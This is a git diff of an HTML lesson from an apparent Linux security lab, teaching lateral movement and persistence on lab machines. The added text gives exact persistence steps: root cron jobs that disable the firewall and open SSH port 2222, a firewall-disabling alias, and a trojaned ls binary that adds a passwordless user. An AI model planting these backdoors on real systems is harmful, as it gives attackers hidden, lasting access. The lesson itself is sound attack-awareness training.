@@ -10,7 +10,7 @@
   <p>In this module, we will primarily focus on lateral movement or the way attackers use an initial point of access to access other machines much more easily.</p>
   <p>While this module is an oversimplification of lateral movement, as all virtual machine are in a contained environment, it still provides the basics for how one would go about moving from computer to computer.</p>
   <p>We already covered initial access in the last module, so we will skip over most of that. Run the command placeholder to access the initial target machine using ssh.</p>
-  <p>To be able to view ip addresses available to the new machine, run the command "apt install nmap" to install nmap on the target machine..</p>
+  <p>Because of the environment the machines are in, neither can connect to the internet meaning the remote machine cannot install nmap like you would in a real scenario. Luckily, all necessary tools have been installed on that client already.</p>
   <p>Run the command placeholder to view the network from this machine's perspective. Run the same command on the kali instance (using a 2nd terminal) and compare the two results.</p>
   <br>
   <p>What ip address shows different results for the kali machine and the remote machine?</p>
@@ -40,8 +40,21 @@
   <p>While we now have access to both the server and the workstation, this access is not permanent. If either of the computers turn off, if either ssh connection is killed, or if firewall rules are changed, we will lose access to these machine. An attacker normally needs a good deal of time to accomplish their goal which is why they establish persistance.</p>
   <p>There are many ways to do this some of which are more complicated than others. In this module, we will cover the more basic methods.</p>
   <p>The easiest method is crontab. Crontab is similar to windows task scheduler in that it performs designated jobs at set times. This utility is very versatile and it comes installed on every Linux version.</p>
-  <p>While still logged into to </p>
+  <p>While still logged into to server, elevate to root and enter the command "crontab -e" to enter root's crontab. Type out "* * * * * ufw disable" at the bottom of the file. This line means that the system will, as root, run the command "ufw disable" every minute of every hour of every day of every month and on every day of the week. These are what the asterisks stand for.</p>
+  <p>This will turn off the server's firewall allowing you to access it directly. Test this by running the command "ssh cyber2@192.168.10.20" in the kali terminal. </p>
+  <p>Next type "1 1 * * 1 echo port 2222 >> /etc/ssh/sshd_config" under the previous line. Remember from module B when we configured ssh? We set the port as 22 by uncommenting the line "port 22" in the file /etc/ssh/sshd_config. This line does a similar thing. It opens a new ssh port on 2222 which is not often checked by a system administrator. This will allow use to use that port rather than 22 to access the server.</p>
+  <p>Another thing we can do is create alias. An alias is when you make a simple string or another command into a designated command. Once of the most common commands is the ls command. This command is so common that its mispelling "sl" is also quite common (you may have even typed it yourself a few times).</p>
+  <p>Type out the command "nano ~/.bashrc" to enter into root's bashrc file. This file controls aliases. Move to the bottom of the file and type out "alias sl=ufw disable" to set an alias. Now, whenever someone mistypes the command, the firewall will be disabled again. </p>
+  <p>Finally, the last method we will cover is modifying binary files. While this sounds challenge (and indeed can become very complex), the way we will be doing it is simple yet still effective.</p>
+  <p>Move to /usr/bin where all the binary files all. Once here, run the command "cp ls /lost+found" to move the ls binary to /lost+found. You would normally change the name of the file and move it to a descrete location, but to keep it simple we will stick with /lost+found/ls. Now make a new file in /usr/bin call ls and modify it to contain the lines "#!/bin/bash" "ufw disable" "useradd entry" "clear" "/lost+found/ls" all on different lines</p>
+  <p>The first line established the file as a bash script file allowing all the other lines to work. The second line turns off the firewall. The third adds a user named entry with no password which we can use to gain access to the server easier. The fourth line clear the terminal so that this modification is harder to detect. Finally, the last line runs the actual ls binary so the command seems to act as normal.</p>
+  <p>When combined, these methods ensure that we always have access to the server especially since it is configured to run indefinitely like most servers.</p>
+</div>
 
+<div class=end>
+  <h2>Congratulations on completing Linux Module E!</h2>
+  <h3>You now have a better understanding of how an attacker would think and act while also knowing where to look in your own computer for signs of an attack. This is the final Linux module. If you would like more practice, you may use any of the environments or make your one to learn more about kali's tools or about applications commonly run on Linux.</h3>
+</div>
 
 
 
